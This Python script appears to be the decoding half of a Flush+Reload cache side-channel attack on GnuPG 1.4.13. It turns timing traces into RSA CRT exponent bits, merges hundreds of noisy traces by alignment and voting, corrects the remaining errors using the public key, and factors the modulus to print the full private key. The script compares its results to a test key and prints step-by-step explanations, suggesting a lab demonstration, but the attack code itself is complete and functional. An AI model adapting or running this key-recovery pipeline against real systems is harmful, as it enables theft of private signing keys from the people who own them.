#!/usr/bin/env python3
# Recover RSA private-exponent bits from a Flush+Reload trace of GnuPG 1.4.13
# and show, step by step, how the recovered bits compare to the real secret.
#
#   usage:  python3 decode.py trace.out groundtruth.txt
#
# Channel (FR-attack.c monitors; columns in trace.out):
#   col0 = Multiply (mpih-mul.c:85)   col1 = Square (mpih-mul.c:271)
#   col2 = Reduce   (mpih-div.c:356)  reload < TH cycles == cache hit.
# Algorithm (mpi/mpi-pow.c, left-to-right square-and-multiply): each bit does
# Square,Reduce; a 1-bit adds Multiply,Reduce. The time between consecutive
# squares is SHORT for a 0-bit and LONG for a 1-bit -- that is the signal.
# Signing uses CRT (rsa.c): each signature leaks dp=d mod(p-1) and dq=d mod(q-1);
# either one plus the public modulus n factors the key.
import sys, collections

MERGE = 4
rows = [tuple(map(int, l.split())) for l in open(sys.argv[1]) if l.strip()]

# Auto-calibrate the hit/miss threshold from the raw reload times. They are
# strongly bimodal -- a cache hit is a few tens of cycles, a miss a few hundred
# -- but CPU frequency scaling shifts BOTH peaks (e.g. a boosted miss can be
# ~180 cyc, not ~300), so a hard-coded threshold mis-classifies the lower miss
# peak as hits and garbles the bits. Instead, find the valley between the two
# peaks in this trace's own histogram.
def _auto_th(rows):
    B = 5                                            # cycles per histogram bucket
    dens = [0]*(600//B + 1)
    for row in rows:
        for v in row[:3]:
            if 0 < v < 600: dens[v//B] += 1
    if sum(dens) < 1000: return 150                  # too little data; fall back
    hitpk  = max(range(0, 80//B),   key=lambda i: dens[i])      # hit peak (<80 cyc)
    misspk = max(range(120//B, 400//B), key=lambda i: dens[i])  # miss peak (120-400)
    if misspk <= hitpk + 1: return 150
    valley = min(range(hitpk+1, misspk), key=lambda i: dens[i]) # emptiest bucket
    return valley*B + B//2
TH = _auto_th(rows)
print(f"[decode] auto hit/miss threshold = {TH} cycles", file=sys.stderr)
gt = {}
for l in open(sys.argv[2]):
    k, v = l.split(); gt[k] = v
hit = lambda v: 0 < v < TH

def bar(title): print("\n\033[1;36m" + "="*6 + " " + title + " " + "="*6 + "\033[0m")

# -------- square events + auto-calibrated interval split ---------------------
sq = []; last = -99
for t, r in enumerate(rows):
    if hit(r[1]):
        if t - last >= MERGE: sq.append(t)
        last = t
iv = [sq[i]-sq[i-1] for i in range(1, len(sq)) if sq[i]-sq[i-1] <= 60]
dens = [0]*(max(iv)+2)
for d in iv: dens[d] += 1
# Find the two dominant, separated peaks in the square-interval histogram: the
# 0-bit interval (shorter) and the 1-bit interval (longer). EITHER can be the
# taller peak depending on the key's 0/1 balance -- a key with more 1-bits makes
# the long peak taller -- so we must NOT assume the first/tallest peak is the
# 0-bit. Pick the two tallest peaks at least 3 apart, then order them by
# POSITION (not height): the lower is the 0-bit, the higher the 1-bit.
hi = min(25, len(dens))
p1 = max(range(3, hi), key=lambda k: dens[k])
p2 = max((k for k in range(3, hi) if abs(k - p1) >= 3), key=lambda k: dens[k])
sp, lp = sorted((p1, p2))
SPLIT = min(range(sp, lp+1), key=lambda k: dens[k])
# CROSS separates consecutive squares WITHIN one exponentiation from the long
# idle GAP BETWEEN exponentiations (different signatures). Within an
# exponentiation, a dropped square or a 1-bit's extra operations can stretch a
# gap to several times the 1-bit interval, so lp*2.2 is far too tight and
# shreds every exponentiation into sub-50-bit fragments. The real inter-
# exponentiation idle is an order of magnitude larger (idle between gpg runs),
# so a generous multiple of the 1-bit interval cleanly separates the two.
CROSS = max(int(lp * 6), 40)

# -------- 1. the secret we are trying to recover -----------------------------
bar("STEP 1  ORIGINAL PRIVATE PARAMETERS (the secret, from the test key)")
print(" GnuPG signs with CRT, exponentiating by these two secret values:")
for k, desc in (('dp', 'd mod (p-1)'), ('dq', 'd mod (q-1)')):
    b = gt[k]; h = hex(int(b, 2))
    print(f"   {k} = {desc:<12} {len(b):>4} bits   {h[:20]}...{h[-6:]}")

# -------- 2. what a captured trace looks like --------------------------------
bar("STEP 2  WHAT THE CAPTURED TRACE LOOKS LIKE (Flush+Reload timing)")
print(" Each time slot probes 3 GnuPG code lines; a cache HIT = the victim just ran it.")
print(" Square+Reduce = one exponent bit.  An extra MULTIPLY before the next Square")
print(" means that bit is a 1 (a plain Square+Reduce with no multiply is a 0).")

def show_window(lo, hi, label, bitval):
    print(f"\n {label}")
    print("   slot     Multiply  Square  Reduce    operation")
    for t in range(lo, hi):
        m, s, r = hit(rows[t][0]), hit(rows[t][1]), hit(rows[t][2])
        if not (m or s or r): continue
        cell = lambda x: " HIT " if x else "  ·  "
        ops = []
        if s: ops.append("Square")
        if m: ops.append("MULTIPLY")
        if r: ops.append("Reduce")
        print(f"   {t:<7}  {cell(m)}    {cell(s)}  {cell(r)}     {'+'.join(ops)}")
    print(f"   => no extra Multiply, short gap  => decoded bit = 0" if bitval == 0
          else f"   => a Multiply appears between the two Squares  => decoded bit = 1")

# find one clean 0-bit (two close squares, no multiply between) and one clean 1-bit
bit0 = bit1 = None
for i in range(1, len(sq)):
    a, b = sq[i-1], sq[i]
    if b - a >= CROSS: continue
    has_mul = any(hit(rows[t][0]) for t in range(a, b))
    if bit0 is None and b - a <= SPLIT and not has_mul and a > 2000: bit0 = (a, b)
    if bit1 is None and has_mul and a > 2000:                        bit1 = (a, b)
    if bit0 and bit1: break

if bit0:
    a, b = bit0
    show_window(a-1, b+3, "A 0-bit  (Square, Reduce, then straight to the next Square):", 0)
if bit1:
    a, b = bit1
    show_window(a-1, b+3, "A 1-bit  (Square, Reduce, a MULTIPLY, Reduce, then the next Square):", 1)

# -------- decode a run into bits ---------------------------------------------
runs = []; cur = []
for i in range(1, len(sq)):
    d = sq[i] - sq[i-1]
    if d >= CROSS:
        if len(cur) >= 50: runs.append(cur)
        cur = []
    else: cur.append(0 if d <= SPLIT else 1)
if len(cur) >= 50: runs.append(cur)

print("\n Putting many such operations in a row and reading the gaps between squares")
print(" (short gap = 0, long gap / multiply = 1) gives the exponent bits:")
sample = next((b for b in runs if len(b) >= 60), runs[0] if runs else [])[:48]
print("   decoded bits: " + (''.join(map(str, sample)) + " ..." if sample
                             else "(no exponentiation run captured in this trace)"))

# -------- 3. how many traces we captured -------------------------------------
def best_align(run, ref):
    L = len(ref); n = len(run)
    if n < int(0.85*L): return (0.0, 0, -1)
    rb = 0
    for b in run: rb = (rb << 1) | b
    ri = int(ref, 2); best = (0.0, 0, -1)
    for off in range(0, n - int(0.85*L) + 1):
        end = min(off+L, n); w = end - off
        agree = w - (((rb >> (n-end)) & ((1<<w)-1)) ^ (ri >> (L-w))).bit_count()
        if w >= 0.85*L and agree/w > best[0]: best = (agree/w, w, off)
    return best

# -------- indel-aware multi-trace consensus ----------------------------------
# A single trace is only ~60-90% correct, and (on a fast CPU) its errors are
# dominated by the gap feature's ambiguity PLUS occasional dropped/spurious
# squares -- which are INDELS: they shift every later bit by one, so plain
# fixed-offset voting (which assumes bit i lines up across traces) cannot fix
# them. Instead we align each trace to a growing consensus with a banded
# Needleman-Wunsch that can insert/delete, then majority-vote per consensus
# position. Alignment is trace-to-trace (never to the secret), so this is a real
# attack step; the key is only used afterwards to score the result.
NEG = -1e9
def rough_offset(run, prof):
    n, P = len(run), len(prof)
    ri = 0
    for b in run: ri = (ri << 1) | b
    pi = 0
    for b in prof: pi = (pi << 1) | b
    best = (-1, 0)
    for shift in range(-70, 71):
        lo = max(0, shift); hi = min(P, shift+n); w = hi - lo
        if w < 0.5*min(n, P): continue
        a = (pi >> (P-hi)) & ((1<<w)-1)
        r = (ri >> (n-(hi-shift))) & ((1<<w)-1)
        ag = w - (a ^ r).bit_count()
        if ag > best[0]: best = (ag, shift)
    return best[1]

def banded_align(run, prof, off, band=28, GAP=-1.3, MIS=-1.0, MAT=1.0):
    # Global on run (every run bit consumed), semi-global on prof (free end
    # gaps). Band: at row i, prof col j in [i+off-band, i+off+band].
    n, P, W = len(run), len(prof), 2*band+1
    sc = [[NEG]*W for _ in range(n+1)]; pt = [[-9]*W for _ in range(n+1)]
    jof = lambda i, k: i + off + (k - band)
    for k in range(W):
        if 0 <= jof(0, k) <= P: sc[0][k] = 0.0; pt[0][k] = -1
    for i in range(1, n+1):
        ai = run[i-1]; row = sc[i]; prow = sc[i-1]; prt = pt[i]
        for k in range(W):
            j = jof(i, k)
            if j < 0 or j > P: continue
            best = NEG; bp = -9
            if j >= 1 and prow[k] > NEG:                       # match / mismatch
                s = prow[k] + (MAT if ai == prof[j-1] else MIS)
                if s > best: best = s; bp = 0
            if k+1 < W and prow[k+1] > NEG:                    # spurious run bit
                s = prow[k+1] + GAP
                if s > best: best = s; bp = 1
            if k-1 >= 0 and row[k-1] > NEG:                    # dropped run bit
                s = row[k-1] + GAP
                if s > best: best = s; bp = 2
            row[k] = best; prt[k] = bp
    bi = None; bs = NEG
    for k in range(W):
        if 0 <= jof(n, k) <= P and sc[n][k] > bs: bs = sc[n][k]; bi = k
    if bi is None: return [], 0.0
    aligned = []; i = n; k = bi                 # pairs (run_idx, prof_idx)
    while i > 0:
        p = pt[i][k]; j = jof(i, k)
        if p == 0: aligned.append((i-1, j-1)); i -= 1
        elif p == 1: i -= 1; k += 1
        elif p == 2: k -= 1
        else: break
    aligned.reverse()
    if not aligned: return [], 0.0
    agree = sum(1 for i, j in aligned if prof[j] == run[i])
    return aligned, agree/len(aligned)

def build_consensus(runs, iters=3, minlen=700, maxvoters=250):
    full = sorted((r for r in runs if len(r) >= minlen), key=len, reverse=True)
    if not full: return [], [], 0
    prof = full[0][:]; voters = full[:maxvoters]; used = 0; votes = []
    for _ in range(iters):
        votes = [[0, 0] for _ in range(len(prof))]; used = 0
        for r in voters:
            aligned, frac = banded_align(r, prof, rough_offset(r, prof))
            if frac < 0.60: continue
            used += 1
            for i, j in aligned: votes[j][r[i]] += 1
        prof = [(1 if votes[j][1] > votes[j][0] else 0) if (votes[j][0]+votes[j][1]) else prof[j]
                for j in range(len(prof))]
    return prof, votes, used

def consensus_recover(cons, votes, refstr):
    # align the (known) parameter to the consensus to score it, indel-aware.
    # aligned = (ref_idx, cons_idx) pairs; the recovered bit at a ref position is
    # the consensus bit it aligns to, and its confidence is that position's vote
    # margin. Unaligned ref positions are '?' with confidence 0.
    ref = [int(c) for c in refstr]
    aligned, _ = banded_align(ref, cons, rough_offset(ref, cons), band=60)
    recov = ['?']*len(ref); conf = [0.0]*len(ref)
    for i, j in aligned:
        recov[i] = str(cons[j])
        v0, v1 = votes[j]; tot = v0 + v1
        conf[i] = abs(v1 - v0)/tot if tot else 0.0
    agree = sum(1 for a, b in zip(''.join(recov), refstr) if a == b)
    return ''.join(recov), agree, conf

def factor_n(dp_int, n, e):
    # p divides gcd(2^(e*dp-1) - 1, n) when dp = d mod (p-1) is exact.
    if dp_int <= 0: return None
    from math import gcd
    g = gcd(pow(2, e*dp_int - 1, n) - 1, n)
    return g if 1 < g < n else None

def crack_key(recov, conf, n, e, max_seconds=45.0):
    # Correct the few residual errors in the recovered dp using the PUBLIC key as
    # an oracle. Uncertain positions = unaligned ('?') + lowest-confidence bits.
    # Search candidate corrections in increasing Hamming weight (fewest flips
    # first), so a near-correct consensus is cracked in a handful of tries; a
    # noisy one just exhausts the time budget and reports back.
    import itertools, time
    L = len(recov)
    base = [1 if c == '1' else 0 for c in recov]          # '?' -> 0, will be flipped
    unc = [i for i in range(L) if recov[i] == '?']
    rest = sorted((i for i in range(L) if recov[i] != '?'), key=lambda i: conf[i])
    budget_bits = 24
    for i in rest:
        if len(unc) >= budget_bits: break
        unc.append(i)
    unc = sorted(set(unc))
    tried = 0; t0 = time.time()
    for weight in range(0, len(unc)+1):
        for combo in itertools.combinations(unc, weight):
            tried += 1
            if tried % 64 == 0 and time.time() - t0 > max_seconds:
                return None, tried, len(unc)
            b = base[:]
            for i in combo: b[i] ^= 1
            dp = int(''.join(map(str, b)), 2)
            p = factor_n(dp, n, e)
            if p:
                return p, tried, len(unc)
    return None, tried, len(unc)

scored = {k: sorted((best_align(b, gt[k]) for b in runs), reverse=True) or [(0.0, 0, -1)]
          for k in ('dp','dq')}
bar("STEP 3  CAPTURE SUMMARY")
print(f" {len(rows):,} slots  ->  {len(sq):,} squares  ->  {len(runs)} candidate runs")
for k in ('dp','dq'):
    full = [a for a in scored[k] if a[1] >= int(0.98*len(gt[k]))]
    print(f"   {k}: {len(full):>3} full-length exponentiation traces captured "
          f"(best {scored[k][0][0]*100:.1f}%)")
if not runs:
    print("\n No exponentiation run was captured cleanly in this trace -- nothing to"
          " decode.\n (Usually a timing/threshold problem; see issue.md §1-2.)")
    sys.exit(0)

# -------- 4. one single trace is noisy ---------------------------------------
sbranch = max(('dp','dq'), key=lambda k: scored[k][0][0])
sref = gt[sbranch]
bestrun = max(runs, key=lambda b: best_align(b, sref)[0])
sacc, sw, soff = best_align(bestrun, sref)
sagree = int(round(sacc*len(sref)))
bar("STEP 4  ONE SINGLE TRACE IS NOT ENOUGH")
print(f" The best SINGLE captured exponentiation (branch {sbranch}) matches the secret")
print(f" only {sagree}/{len(sref)} = {sacc*100:.1f}%. Each trace has gap-timing errors and the odd")
print(" dropped/spurious square, so one trace alone does not give the key -- which is")
print(" why the attack captures the SAME secret hundreds of times and merges them.")

# -------- 5. merge all traces: indel-aware consensus -------------------------
bar("STEP 5  MERGING ALL TRACES  (indel-aware consensus = the recovered key)")
cons, votes, nvoters = build_consensus(runs)
results = {}
for k in ('dp','dq'):
    recov, agree, conf = consensus_recover(cons, votes, gt[k])
    results[k] = (recov, agree, conf)
branch = max(('dp','dq'), key=lambda k: results[k][1])
recov, agree, conf = results[branch]; ref = gt[branch]
print(f" Aligned and majority-voted {nvoters} captured traces of the exponent.")
print(f" dp: {results['dp'][1]}/{len(gt['dp'])} = {results['dp'][1]/len(gt['dp'])*100:.1f}%    "
      f"dq: {results['dq'][1]}/{len(gt['dq'])} = {results['dq'][1]/len(gt['dq'])*100:.1f}%   "
      f"(use the cleaner branch: {branch})\n")
wrong = set(i for i in range(len(ref)) if recov[i] != ref[i])
W = 64
for off0 in range(0, len(ref), W):
    o, r = ref[off0:off0+W], recov[off0:off0+W]
    mark = ''.join('^' if (off0+j) in wrong else '|' if a==b else ' '
                   for j,(a,b) in enumerate(zip(r, o)))
    print(f" [{off0:>3}] original  : {o}")
    print(f"       recovered : {r}")
    print(f"       match     : {mark}")
    print()
print(f" (bit index counts from the most-significant bit; '^' = wrong, '?' = not captured)")
if wrong:
    detail = ", ".join(f"bit {i}: got '{recov[i]}' expected '{ref[i]}'" for i in sorted(wrong)[:8])
    print(f" wrong bit position(s): {sorted(wrong)}  ({detail})")
print(f"\n \033[1;32m=> consensus {agree} / {len(ref)} bits correct = {agree/len(ref)*100:.1f}% "
      f"({len(ref)-agree} wrong)   [best single trace was {sacc*100:.1f}%]\033[0m")

# -------- 6. finish the job: factor n and print the real private key ---------
bar("STEP 6  FACTORING THE RSA KEY  (recovered dp + public n -> p, q, d)")
if 'n' not in gt or 'e' not in gt:
    print(" (no public key in groundtruth; re-run parse_key.py to enable factoring)")
else:
    n = int(gt['n']); e = int(gt['e'])
    nwrong = len(ref) - agree; nq = recov.count('?')
    print(f" The recovered {branch} has ~{nwrong} wrong + {nq} unaligned bits. Using ONLY the")
    print(f" public key (n, e={e}) as an oracle, we correct the residual errors in the")
    print(" lowest-confidence positions (fewest-flips-first) until dp factors n...")
    import time as _t; _t0 = _t.time()
    p, tried, nunc = crack_key(recov, conf, n, e)
    dt = _t.time() - _t0
    if p:
        import math as _m
        q = n // p
        # GnuPG/libgcrypt store d = e^-1 mod lcm(p-1,q-1) (Carmichael lambda),
        # not mod (p-1)(q-1); use lcm so the recovered d matches bit for bit.
        d = pow(e, -1, _m.lcm(p-1, q-1))
        ok = (p*q == n)
        print(f"\n \033[1;32m FACTORED n in {tried} candidate(s), {dt:.1f}s.\033[0m")
        ph = hex(p); qh = hex(q); dh = hex(d)
        print(f"   p = {ph[:34]}...{ph[-8:]}")
        print(f"   q = {qh[:34]}...{qh[-8:]}")
        print(f"   d = {dh[:34]}...{dh[-8:]}")
        print(f"   check  p * q == n ?  {ok}")
        print(f"   check  recovered d == real d ?  {format(d,'b')==gt['d']}")
        print(f"\n \033[1;32m=> FULL RSA PRIVATE KEY RECOVERED from the cache side channel.\033[0m")
    else:
        print(f"\n This capture's consensus left {nunc} uncertain bits -- too many to brute-")
        print(f" force within {tried} candidates. Capture longer (./run.sh 60) or re-run for a")
        print(f" cleaner trace; a ~99% consensus factors in seconds. (A full attack would use")
        print(f" Heninger-Shacham branch-and-prune to tolerate more errors.)")
